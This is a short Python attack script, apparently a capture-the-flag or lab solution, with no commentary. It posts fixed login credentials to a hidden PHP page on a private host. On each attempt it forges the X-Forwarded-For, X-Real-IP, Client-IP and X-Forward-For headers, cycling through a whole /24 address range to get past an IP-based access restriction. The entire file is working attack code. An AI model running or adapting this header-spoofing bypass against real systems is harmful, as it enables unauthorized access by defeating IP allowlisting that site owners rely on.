import requests

headers = {
    "Host" : "10.94.87.66",
    "Connection" : "keep-alive",
    "Content-Length" : "47",
    "Cache-Control" : "max-age=0",
    "Origin" : "http://10.94.87.66",
    "Upgrade-Insecure-Requests" : "1",
    "Content-Type" : "application/x-www-form-urlencoded",
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Referer" : "http://10.94.87.66/secret/no_one_knows_here.php",
    "Accept-Encoding" : "gzip, deflate",
    "Accept-Language" : "zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7"
}

data = {
    "username" : "frank",
    "password" : "just do it",
    "submit" : "Login"
}

source = "10.94.87."
for i in range(256):
    ip = source + str(i)
    headers['X-Forwarded-For'] = ip
    headers['X-Real-IP'] = ip
    headers['Client-IP'] = ip
    headers['X-Forward-For'] = ip

    url = "http://10.94.87.66/secret/no_one_knows_here.php"
    r = requests.post(url, data = data, headers = headers)
    print(ip)
    print(r.text[200:300])
